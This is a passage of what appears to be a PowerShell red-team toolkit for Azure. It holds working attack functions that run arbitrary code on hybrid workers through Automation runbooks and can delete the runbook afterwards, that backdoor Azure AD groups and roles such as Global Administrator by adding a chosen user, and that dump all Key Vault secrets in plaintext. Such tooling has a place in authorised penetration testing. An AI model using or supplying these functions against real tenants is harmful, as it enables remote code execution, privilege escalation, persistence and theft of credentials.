    [CmdletBinding(DefaultParameterSetName = 'Auto')]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $RunbookName,

        [String]
        $ScriptPath = $null,

        [String]
        $Command = $null,

        [Switch]
        $RemoveAfter,

        [Parameter(Mandatory=$True, ParameterSetName = 'Manual')]
        [String]
        $AutomationAccountName = $null,

        [Parameter(Mandatory=$True, ParameterSetName = 'Manual')]
        [String]
        $ResourceGroupName = $null,

        [Parameter(Mandatory=$True, ParameterSetName = 'Manual')]
        [String]
        $WorkergroupName = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if ($ScriptPath -ne $null -and $Command -ne $null -and $ScriptPath.Length -gt 0 -and $Command.Length -gt 0) {
            Write-Error "-ScriptPath and -Command are mutually exclusive. Pick one to continue."
            Return
        }

        if (($ScriptPath -eq $null -and $Command -eq $null) -or ($ScriptPath.Length -eq 0 -and $Command.Length -eq 0)) {
            Write-Error "Missing one of the required parameters: -ScriptPath or -Command"
            Return
        }

        $createdFile = $false

        if ($Command -ne $null -and $Command.Length -gt 0) {
            $File = New-TemporaryFile
            $ScriptPath = $File.FullName
            Remove-Item $ScriptPath
            $ScriptPath = $ScriptPath + ".ps1"

            Write-Verbose "Writing supplied commands to a temporary file..."
            $Command | Out-File $ScriptPath
            $createdFile = $true
        }

        $AutomationAccount = Get-AzAutomationAccount

        Write-Host "`nStep 1. Get the role of a user on the Automation account"
        $roles = (Get-AzRoleAssignment | ? { $_.Scope -like '*Microsoft.Automation*' } | ? { $_.RoleDefinitionName -match 'Contributor' -or $_.RoleDefinitionName -match 'Owner' })

        if ($roles -eq $null -or $roles.Length -eq 0 ) {
            Write-Warning "Did not find assigned Roles for the Azure Automation service. The principal may be unauthorized to import Runbooks!"
        }
        else {
            $r = $roles[0].RoleDefinitionName
            Write-Host "[+] Principal has $r rights over Azure Automation."
        }

        if($PsCmdlet.ParameterSetName -eq "Auto") {
            # /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT-NAME>
            $parts = $roles[0].Scope.Split('/')

            if($AutomationAccountName -eq $null -or $AutomationAccountName.Length -eq 0) {
                $AutomationAccountName = $parts[8]
            }

            if($AutomationAccountName -eq $null -or $ResourceGroupName.Length -eq 0) {
                $ResourceGroupName = $parts[4]
            }
        }
        
        Write-Verbose "[.] Will target resource group: $ResourceGroupName and automation account: $AutomationAccountName"

        Write-Host "`nStep 2. List hybrid workers"
        $workergroup = Get-AzAutomationHybridWorkerGroup -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
        $Workergroup

        if($WorkergroupName -eq $null -or $WorkergroupName.Length -eq 0) {
            $WorkergroupName = $workergroup.Name
        }

        Write-Host "`nStep 3. Create a Powershell Runbook`n"
        Import-AzAutomationRunbook -Name $RunbookName -Path $ScriptPath -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell -Force -Verbose

        Write-Host "`nStep 4. Publish the Runbook`n"
        Publish-AzAutomationRunbook -RunbookName $RunbookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Verbose

        Write-Host "`nStep 5. Start the Runbook`n"
        Start-AzAutomationRunbook -RunbookName $RunbookName -RunOn $WorkergroupName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Verbose

        if($RemoveAfter) {
            Write-Host "`nStep 6. Removing the Runbook.`n"
            Remove-AzAutomationRunbook -AutomationAccountName $AutomationAccountName -Name $RunbookName -ResourceGroupName $ResourceGroupName -Force
        }

        if($createdFile) {
            Remove-Item $ScriptPath
        }

        Write-Host "Attack finished."
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Add-ARTUserToGroup {
    <#
    .DESCRIPTION
        Adds a specified Azure AD User to the specified Azure AD Group.

    .PARAMETER Account
        Specifies Account ID/DisplayName/UserPrincipalName that is to be added to the Group.

    .PARAMETER GroupName
        Specifies target Group that is to be backdoored with new user.

    .EXAMPLE
        PS> Add-ARTUserToGroup -Account myuser -GroupName "My Company Admins"
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $Account,

        [Parameter(Mandatory=$True)]
        [String]
        $GroupName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $User = Get-AzureADUser | ? { $_.ObjectId -eq $Account -or $_.DisplayName -eq $Account -or $_.UserPrincipalName -eq $Account }

        if ($User -eq $null -or $User.ObjectId -eq $null) {
            Write-Error "Could not find target user with Account: $Account"
            Return
        }

        $Group = Get-AzureADGroup | ? { $_.ObjectId -eq $GroupName -or $_.DisplayName -eq $GroupName}

        if ($Group -eq $null -or $Group.ObjectId -eq $null) {
            Write-Error "Could not find target group with name: $GroupName"
            Return
        }

        Add-AzureADGroupMember -ObjectId $Group.ObjectId -RefObjectId $User.ObjectId

        Write-Host "[+] Added user $($User.DisplayName) to Azure AD Group $($Group.DisplayName) ($($Group.ObjectId))"
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTAzRoleAssignment {
    <#
    .DESCRIPTION
        Displays a bit easier to read representation of assigned Azure RBAC roles to the currently used Principal.

    .EXAMPLE
        PS> Get-ARTAzRoleAssignment | Format-Table
    #>

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $roles = Get-AzRoleAssignment
        $Coll = New-Object System.Collections.ArrayList
        $roles | % {
            $parts = $_.Scope.Split('/')
            $scope = $parts[6..$parts.Length] -join '/'

            $obj = [PSCustomObject]@{
                RoleDefinitionName= $_.RoleDefinitionName
                Resource          = $scope
                ResourceGroup     = $parts[4]
                ObjectType        = $_.ObjectType
                CanDelegate       = $_.CanDelegate
                Scope             = $_.Scope
            }

            $null = $Coll.Add($obj)
        }

        $Coll
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Add-ARTUserToRole {
    <#
    .DESCRIPTION
        Adds a specified Azure AD User to the specified Azure AD Role.

    .PARAMETER Account
        Specifies Account ID/DisplayName/UserPrincipalName that is to be added to the Role.

    .PARAMETER RoleName
        Specifies target Role that is to be backdoored with new user.

    .EXAMPLE
        PS> Add-ARTUserToRole -Account myuser -RoleName "Global Administrator"
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $Account,

        [Parameter(Mandatory=$True)]
        [String]
        $RoleName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $User = Get-AzureADUser | ? { $_.ObjectId -eq $Account -or $_.DisplayName -eq $Account -or $_.UserPrincipalName -eq $Account }

        if ($User -eq $null -or $User.ObjectId -eq $null) {
            Write-Error "Could not find target user with Account: $Account"
            Return
        }

        $Role = Get-AzureADDirectoryRole | ? { $_.ObjectId -eq $RoleName -or $_.DisplayName -eq $RoleName}

        if ($Role -eq $null -or $Role.ObjectId -eq $null) {
            Write-Error "Could not find target group with name: $RoleName"
            Return
        }

        Add-AzureADDirectoryRoleMember -ObjectId $Role.ObjectId -RefObjectId $User.ObjectId

        Write-Host "[+] Added user $($User.DisplayName) to Azure AD Role $($Role.DisplayName) ($($Role.ObjectId))"
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTKeyVaultSecrets {
    <#
    .DESCRIPTION
        Lists all available Azure Key Vault secrets. 
        This cmdlet assumes that requesting user connected to the Azure AD with KeyVaultAccessToken 
        (scoped to https://vault.azure.net) and has "Key Vault Secrets User" role assigned (or equivalent).

    .EXAMPLE
        PS> Get-ARTKeyVaultSecrets
    #>
    
    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $Coll = New-Object System.Collections.ArrayList
        
        Get-AzKeyVault | % {
            $VaultName = $_.VaultName

            Get-AzKeyVaultSecret -VaultName $VaultName | % {
                $SecretName = $_.Name

                $value = Get-AzKeyVaultSecret -VaultName $VaultName -Name $SecretName -AsPlainText

                $obj = [PSCustomObject]@{
                    VaultName = $VaultName
                    Name      = $SecretName
                    Value     = $value
                    Created   = $_.Created
                    Updated   = $_.Updated
                    Enabled   = $_.Enabled
                }

                $null = $Coll.Add($obj)
            }
        }

        $Coll
    }
    catch {
        Write-Host "[!] Function failed!"
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}
